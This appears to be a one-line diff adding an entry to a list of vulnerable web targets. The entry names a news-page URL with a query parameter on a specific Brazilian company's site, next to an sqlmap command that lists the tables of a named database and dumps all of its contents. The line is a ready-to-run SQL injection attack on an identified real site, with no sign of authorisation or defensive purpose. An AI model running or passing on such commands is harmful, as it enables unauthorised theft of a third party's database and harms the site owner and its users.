@@ -1,0 +1,1 @@
+http://www.alvtintas.com.br/noticias.php?codigo=24 (GET)  # sqlmap.py -u http://www.alvtintas.com.br/noticias.php?codigo=24 -D alvtinbr2 --tables --dump-all --threads 5 -v3
